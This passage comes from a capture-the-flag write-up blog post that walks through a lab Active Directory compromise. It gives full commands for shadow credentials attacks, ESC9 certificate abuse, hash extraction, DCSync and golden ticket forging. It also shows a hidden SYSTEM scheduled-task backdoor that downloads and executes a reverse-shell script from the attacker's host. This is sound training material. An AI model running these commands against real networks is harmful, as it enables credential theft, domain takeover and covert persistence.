+<li><figure><img src="/ox-hugo/2024-11-06-092400_.png">
+</figure>
+</li>
+<li>+Note+: There will be no output from this command, we need to instead verify it worked in the next command.</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify Judith is now part of the group</strong>:</p>
+<ul>
+<li><code>net rpc group members &quot;Management&quot; -U $domain/$user%$pass -S $box</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-092514_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="performing-the-shadow-credentials-attack-against-management-svc">Performing the shadow credentials attack against &ldquo;MANAGEMENT_SVC&rdquo;:</h3>
+<h4 id="setting-up-pywhisker">Setting up pywhisker:</h4>
+<ul>
+<li>
+<p><strong>As we are performing this from a linux host we need to use the python based version of whisker</strong>: <a href="https://github.com/ShutdownRepo/pywhisker">https://github.com/ShutdownRepo/pywhisker</a></p>
+<ul>
+<li><code>git clone https://github.com/ShutdownRepo/pywhisker.git</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Lets create a venv so it does not mess with our base python installation</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  <span style="color:#75715e">#Navigate into the repo:</span>
+</span></span><span style="display:flex;"><span>  cd pywhisker
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#Create the venv:</span>
+</span></span><span style="display:flex;"><span>  python -m venv whisker
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#Activate the venv:</span>
+</span></span><span style="display:flex;"><span>  source whisker/bin/activate
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#Install our dependencies in the venv:</span>
+</span></span><span style="display:flex;"><span>  pip install -r requirements.txt</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>I try to run it but get the below error</strong>:</p>
+<ul>
+<li><code>python3 pywhisker.py -d $domain -u $user -p $pass --target &quot;MANAGEMENT_SVC&quot; --action &quot;add&quot; --filename newCert --export PEM</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-094708_.png">
+</figure>
+</li>
+<li>Looking online leads me to this open issue: <a href="https://github.com/ShutdownRepo/pywhisker/issues/21">https://github.com/ShutdownRepo/pywhisker/issues/21</a>
+<ul>
+<li>It appears to not run from a <code>venv</code> currently due to the way imports are handled. So we will need to check out a previous git branch.</li>
+<li><figure><img src="/ox-hugo/2024-11-06-105230_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="finding-a-previous-pywhisker-commit-prior-to-breaking-changes-and-using-that">Finding a previous pywhisker commit prior to breaking changes and using that:</h5>
+<ul>
+<li>
+<p><strong>Click &ldquo;Commits&rdquo;</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-102950_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Find the commmit we want</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-103053_.png">
+</figure>
+</li>
+<li>Click on it.</li>
+</ul>
+</li>
+<li>
+<p><strong>Grab the full commit hash</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-103200_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Check it out</strong>:</p>
+<ul>
+<li><code>git checkout -f ec30ba5759d57ead54341f58289090a9dc01249a</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I found the commit that was before the breaking changes to envs</strong>:</p>
+<ul>
+<li><code>git checkout -f ec30ba5759d57ead54341f58289090a9dc01249a</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-102455_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="using-pywhisker-to-perform-our-shadow-credentials-attack">Using pywhisker to perform our shadow credentials attack:</h4>
+<ul>
+<li>
+<p><strong>I run pywhisker and it works</strong>:</p>
+<ul>
+<li><code>python3 /home/kali/windowsTools/pywhisker/pywhisker.py -d $domain -u $user -p $pass --target &quot;MANAGEMENT_SVC&quot; --action &quot;add&quot; --filename newCert --export PEM</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-104658_.png">
+</figure>
+
+<ul>
+<li>We get our <code>newCert_cert.pem</code> &amp; our <code>newCert_priv.pem</code> which we will use next</li>
+</ul>
+</li>
+<li>+Note+: If this fails and you get the below error then you should follow the steps of granting Judith the ability to add users to groups and the subsequent steps. I believe there is some sort of cleanup rule in place which cleans up ACL&rsquo;s.
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-104843_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Looking at pywhiskers readme it says</strong>:</p>
+<blockquote>
+<p>Once the values are generated and added by <code>pyWhisker</code>, a <code>TGT</code> can be request with <code>gettgtpkinit.py</code> The NT hash can then be recovered with <code>getnthash.py</code>.</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="installing-pkinit">Installing PKINIT:</h4>
+<ul>
+<li>
+<p><strong>Clone repo</strong>:</p>
+<ul>
+<li><code>git clone https://github.com/dirkjanm/PKINITtools.git</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Setup venv</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>    <span style="color:#75715e">#Navigate into the repo:</span>
+</span></span><span style="display:flex;"><span>    cd pkinit
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#Create the venv:</span>
+</span></span><span style="display:flex;"><span>    python -m venv pk
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#Activate the venv:</span>
+</span></span><span style="display:flex;"><span>    source pk/bin/activate
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#Install our dependencies in the venv:</span>
+</span></span><span style="display:flex;"><span>    pip install -r requirements.txt</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h4 id="requesting-a-tgt-management-svc-for-with-pkinittools-getgtgkinit">Requesting a TGT for MANAGEMENT_SVC with PKINITtools getgtgkinit:</h4>
+<ul>
+<li>
+<p><strong>Request TGT &amp; export as</strong> <code>.ccache</code> <strong>by using our</strong> <code>newCert_cert.pem</code> <strong>&amp;</strong> <code>newCert_priv.pem</code>:</p>
+<ul>
+<li><code>python3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem newCert_cert.pem -key-pem newCert_priv.pem $domain/MANAGEMENT_SVC MANAGEMENT_SVC.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-111456_.png">
+</figure>
+</li>
+<li><strong>We can see our</strong> <code>.ccache</code>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-111358_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Next we will load the</strong> <code>ccache</code> <strong>into our</strong> <code>KRB5CCNAME</code> <strong>variable as we will need this for next step</strong>:</p>
+<ul>
+<li><code>export KRB5CCNAME=./MANAGEMENT_SVC.ccache</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="requesting-the-management-svc-user-hash-with-pkinittools-getnthash">Requesting the MANAGEMENT_SVC user hash with PKINITtools getnthash:</h4>
+<ul>
+<li>
+<p><strong>Extract the NTHash for the MANAGEMENT_SVC user</strong>:</p>
+<ul>
+<li><code>python3 /home/kali/windowsTools/PKINITtools/getnthash.py -key d03e77aab1235a85021ef9936275dd2e4df05d027c381d33695338dcb0772389 $domain/MANAGEMENT_SVC</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-112752_.png">
+</figure>
+</li>
+<li>Hash retrieved for <code>MANAGEMENT_SVC</code> account.</li>
+</ul>
+</li>
+<li>
+<p><strong>Lets verify the hash works</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u $user -H $hash</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-113709_.png">
+</figure>
+</li>
+<li>It does.</li>
+</ul>
+</li>
+<li>
+<p>I try and crack the hash using hashcat but it wont&rsquo; crack.</p>
+</li>
+</ul>
+<h3 id="logging-in-as-management-svc">Logging in as MANAGEMENT_SVC:</h3>
+<ul>
+<li>
+<p><strong>Login using evil-winrm</strong>:</p>
+<ul>
+<li><code>evil-winrm -i $box -u $user -H $hash</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Grab our</strong> <code>user.txt</code> <strong>flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-113925_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-lateral-movement">3. Lateral Movement:</h2>
+<h3 id="discovering-that-management-svc-has-genericall-over-ca-operator">Discovering that MANAGEMENT_SVC has GenericAll over CA_OPERATOR:</h3>
+<ul>
+<li><strong>Looking back in bloodhound I see we have</strong> <code>GenericAll</code> <strong>privileges over</strong> &ldquo;CA_OPERATOR&rdquo; <strong>which means we can actually just perform another shadow credentials attack</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-114950_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="performing-the-shadow-credentials-attack-against-ca-operator">Performing the shadow credentials attack against &ldquo;CA_OPERATOR&rdquo;</h3>
+<ul>
+<li><strong>Lets perform our shadow credentiasl attack using pyhisker again</strong>:
+<ul>
+<li><code>python3 /home/kali/windowsTools/pywhisker/pywhisker.py -d $domain -u $user -H :$hash --target &quot;CA_OPERATOR&quot; --action &quot;add&quot; --filename CACert --export PEM</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-115559_.png">
+</figure>
+</li>
+<li>+Note+: I have set the <code>user=MANAGEMENT_SVC</code> in my variables and have exported the extracted hash also.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="requesting-a-tgt-ca-operator-for-with-pkinittools-getgtgkinit">Requesting a TGT for CA_OPERATOR with PKINITtools getgtgkinit:</h3>
+<ul>
+<li>
+<p><strong>Now we perform the same process again to be able to extract their hash by using the</strong> <code>.pem</code> <strong>files we have retrieved to export a</strong> <code>.ccache</code> <strong>we can authenticate with</strong>:</p>
+<ul>
+<li><code>python3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/CA_OPERATOR CA_OPERATOR.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-115914_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We load the</strong> <code>ccache</code> <strong>into our</strong> <code>KRB5CCNAME</code> <strong>variable</strong>:</p>
+<ul>
+<li><code>export KRB5CCNAME=./CA_OPERATOR.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-120133_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="requesting-the-ca-operator-user-hash-with-pkinittools-getnthash">Requesting the CA_OPERATOR user hash with PKINITtools getnthash:</h3>
+<ul>
+<li>
+<p><strong>Now we extract the NTHash</strong>:</p>
+<ul>
+<li><code>python3 /home/kali/windowsTools/PKINITtools/getnthash.py -key 4c6a721a5bbe0a510df5e45f62e579a161cd734466eeaab9586c2466ea815945 $domain/CA_OPERATOR</code></li>
+<li>Hash retrieved for <code>CA_OPERATOR</code> account.</li>
+<li><figure><img src="/ox-hugo/2024-11-06-120259_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Lets verify the hash works</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u $user -H $hash</code></li>
+<li>It does.</li>
+<li><figure><img src="/ox-hugo/2024-11-06-121126_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I try and crack the hash using hashcat but it wont&rsquo; crack either</p>
+</li>
+</ul>
+<h2 id="4-dot-privilege-escalation">4. Privilege Escalation:</h2>
+<h3 id="discovering-that-we-can-perform-the-esc9-exploit-chain-ca-vulnerability-as-ca-operator">Discovering that we can perform the ESC9 exploit chain CA vulnerability as CA_OPERATOR:</h3>
+<ul>
+<li>
+<p><strong>I re-run</strong> <code>certipy-ad</code> <strong>as the &ldquo;CA_OPERATOR&rdquo; user</strong>:</p>
+<ul>
+<li><code>certipy-ad find -vulnerable -u $user@$domain -hashes :$hash -dc-ip $box</code></li>
+<li>It appears that we can follow the <code>ESC9</code> attack chain as this user.</li>
+<li><figure><img src="/ox-hugo/2024-11-06-123503_.png">
+</figure>
+</li>
+<li>There is only 1 certificate template: <code>CertifiedAuthentication</code> which will be the vulnerable one.
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-133802_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Looking at the certipy repo we see the following</strong>:</p>
+<ul>
+<li><a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc9--esc10">https://github.com/ly4k/Certipy?tab=readme-ov-file#esc9--esc10</a></li>
+<li><figure><img src="/ox-hugo/2024-11-06-123731_.png">
+</figure>
+</li>
+<li><a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">Blog Post Mentioned</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="esc9-privilege-escalation">ESC9 Privilege Escalation:</h3>
+<ul>
+<li>Reading the blog post we can see the following requirements are needed:
+<ul>
+<li>+Requirements for the attack+:
+<ol>
+<li><code>GenericWrite</code> over any account (A) to compromise any account (B):
+<ul>
+<li>As we have <code>GenericAll</code> (which includes <code>GenericWrite</code>) over the <code>ca_operator</code> from the  <code>management_svc</code> account we can perform this action.</li>
+</ul>
+</li>
+<li>The NT Hash of Account (A)
+<ul>
+<li>We have already extracted this the <code>ca_operator</code> hash in our previous shadow credentials attack</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="changing-the-upn-of-the-ca-operator-to-be-administrator">Changing the UPN of the ca_operator to be administrator:</h4>
+<ul>
+<li><strong>Change the</strong> <code>userPrincipalName</code> <strong>of</strong> <code>ca_operator</code> <strong>to be</strong> <code>Administrator</code>.
+<ul>
+<li><code>certipy-ad account update -username management_svc@$domain -hashes :$svcHash -user ca_operator -upn Administrator</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-131853_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>+Note+:
+<ul>
+<li>We&rsquo;re omitting the domain for <code>ca_operator</code> to make actions appear as if they’re performed by <code>Administrator</code>.</li>
+<li>This reassigns the identity so that future actions will appear as if <code>ca_operator</code> is the <code>Administrator</code>.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="requesting-our-vulnerable-cert-using-as-the-ca-operator">Requesting our vulnerable cert using as the ca_operator:</h4>
+<ul>
+<li><strong>We request the vulnerable certificate template</strong> <code>CertifiedAuthentication</code> <strong>We must request the certificate as ca_operator</strong>:
+<ul>
+<li><code>certipy-ad req -username ca_operator.$domain -hashes :$caHash -ca certified-DC01-CA -template CertifiedAuthentication</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-132958_.png">
+</figure>
+</li>
+<li>+Note+: The <code>userPrincipalName</code> in the certificate is <code>Administrator</code> since we changed the UPN and omitted <code>ca_operator</code>&rsquo;s domain in step 1, resulting in a certificate without the original <code>ca_operator</code> SID.</li>
+<li>+Why+: Changing the UPN lets us request a certificate with the Administrator&rsquo;s UPN, granting elevated privileges without linking to the original <code>ca_operator</code> SID.</li>
+</ul>
+</li>
+</ul>
+<h4 id="reverting-the-ca-operator-s-upn">Reverting the ca_operator&rsquo;s UPN:</h4>
+<ul>
+<li><strong>Now we change back the</strong> <code>userPrincipalName</code> <strong>of</strong> <code>ca_operator</code> <strong>to the original</strong>  <code>userPrincipalName ca_operator@CERTIFIED.HTB</code>:
+<ul>
+<li><code>certipy-ad account update -username management_svc@$domain -hashes :$svcHash -user ca_operator -upn ca_operator@$domain</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-133034_.png">
+</figure>
+</li>
+<li>+Why+: This avoids detection by reverting ca_operator to its default identity.</li>
+</ul>
+</li>
+</ul>
+<h4 id="authenticating-with-the-certificate-to-retrieve-the-nt-hash-of-the-administrator">Authenticating with the certificate to retrieve the NT hash of the administrator:</h4>
+<ul>
+<li>
+<p><strong>Now we authenticate with the certificate, to receive the NT hash of the Administrator user</strong>:</p>
+<ul>
+<li><code>certipy-ad auth -pfx administrator.pfx -domain $domain</code></li>
+<li>Hash retrieved.
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-133159_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>+Note+: We add <code>-domain</code> to the command because the certificate is set to <code>administrator</code> without a domain specified.</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify the hash works</strong>:</p>
+<ul>
+<li><code>evil-winrm -i $box -u $user -H $hash</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-133338_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Grab our root flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-133454_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-persistence">5. Persistence:</h2>
+<h3 id="dumping-ntds-dot-dit-dc-sync-attack">Dumping NTDS.dit/DC-SYNC attack:</h3>
+<ul>
+<li>
+<p><strong>Perform DC-Sync attack using netexec</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u $user -H $hash -M ntdsutil</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-134536_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Extract all hashes from netexec</strong></p>
+<ul>
+<li><code>for file in /home/kali/.nxc/logs/*.ntds; do cat &quot;$file&quot; | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\n'; done</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-134622_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="creating-a-kerberos-golden-ticket">Creating a Kerberos Golden Ticket:</h3>
+<ul>
+<li>
+<p><strong>Using</strong> <code>impacket-lookupsid</code> <strong>to get the Search for the Domain SID</strong>:</p>
+<ul>
+<li><code>impacket-lookupsid $domain/$user@$machine.$domain -domain-sids -k -no-pass</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-134850_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Sync our clock to the host using ntupdate</strong>:</p>
+<ul>
+<li><code>sudo ntpdate -s $domain</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Using</strong> <code>impacket-ticketer</code> <strong>to create the Golden Ticket</strong>:</p>
+<ul>
+<li><code>impacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-135026_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Export the ticket to the</strong> <code>KRB5CCNAME</code> <strong>Variable</strong>:</p>
+<ul>
+<li><code>export KRB5CCNAME=./Administrator.ccache</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Run Klist</strong>:</p>
+<ul>
+<li><code>klist</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-135100_.png">
+</figure>
+</li>
+<li>+Note+: We can see our ticket lasts for 10 years.</li>
+<li>If we look at our previous ticket, it only lasted 24 hours:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-135202_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Use the ticket for connecting via</strong> <code>psexec</code></p>
+<ul>
+<li><code>impacket-psexec -k -no-pass $machine.$domain</code></li>
+<li>Revoked which means there is some form of protection/mitigation in place.
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-135259_.png">
+</figure>
+</li>
+<li>Instead of going down this path lets look at another solution.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="using-a-base64-encoded-powershell-reverse-shell-and-download-cradle-to-connect-back-to-our-attack-host-every-1-minute">Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host every 1 minute:</h3>
+<ul>
+<li>
+<p>I will create a powershell script and use a download cradle to call back to my attack host, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry) so it will be harder to detect.</p>
+</li>
+<li>
+<p><strong>Create our reverse-shell script</strong>:</p>
+<ul>
+<li>I use a base64 obfuscated powershell reverse shell as otherwise the AV was able to detect it. I like using <a href="https://revshells.com">https://revshells.com</a> for this
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-134155_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We then need to create our scheduled task</strong>:</p>
+<ul>
+<li><code>schtasks /create /tn LetMeIn /tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.14.21:9000/script.ps1'''))'&quot; /sc minute /mo 1 /ru System</code></li>
+<li><figure><img src="/ox-hugo/2024-11-06-161844_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Start our listener &amp; webserver</strong>:</p>
+<ul>
+<li>Webserver:
+<ul>
+<li><code>python3 -m http.server [port]</code></li>
+</ul>
+</li>
+<li>Listener:
+<ul>
+<li><code>rlwrap -cAr nc -nvlp 53</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>The task grabs our script &amp; immediatley executes it in memory</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-161916_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We get our revere shell</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-06-161934_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Double check by disconnecting &amp; seeing if it re-connects</strong>:</p>
+<ul>
+<li>It does:</li>
+<li><figure><img src="/ox-hugo/2024-11-06-162211_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="scheduled-task-backdoor-utilizing-download-cradle-command-breakdown">Scheduled Task Backdoor Utilizing Download Cradle Command Breakdown:</h4>
+<ul>
+<li><code>schtasks /create</code>
+<ul>
+<li>Creates a new scheduled task on Windows.</li>
+</ul>
+</li>
+<li><code>/tn LetMeIn</code>
+<ul>
+<li>Sets the task name to <code>LetMeIn</code>.</li>
+<li>This name is how the task will appear in the Task Scheduler.</li>
+</ul>
+</li>
+<li><code>/tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe</code>
+<ul>
+<li>Specifies the action that the task will execute.</li>
+<li><code>powershell.exe</code>: Starts PowerShell.</li>
+<li><strong>Arguments passed to powershell</strong>:
+<ul>
+<li><code>-WindowStyle hidden</code>: Runs the task in a hidden window to prevent showing the PowerShell window.</li>
+<li><code>NoLogo -NonInteractive -ep bypass -nop</code>: PowerShell flags to suppress output and allow script execution bypassing restrictions.</li>
+<li><code>IEX ((New-Object Net.WebClient).DownloadString(...))</code>: Uses <code>Invoke-Expression</code> to download and immediately execute the script.</li>
+<li><code>/sc minute /mo 1</code>: Sets the task to run every 1 minute.</li>
+<li><code>/ru System</code>: Runs the task under <code>System</code> privileges.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>
+<p>I learned alot more about shadow-credential attacks and CA attacks.</p>
+</li>
+<li>
+<p>I really enjoyed the process of how layered and different the attack chain was for this compared to other boxes I have done.</p>
+</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Not so many, getting better&hellip;.I hope</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        3844
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Nov 06 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
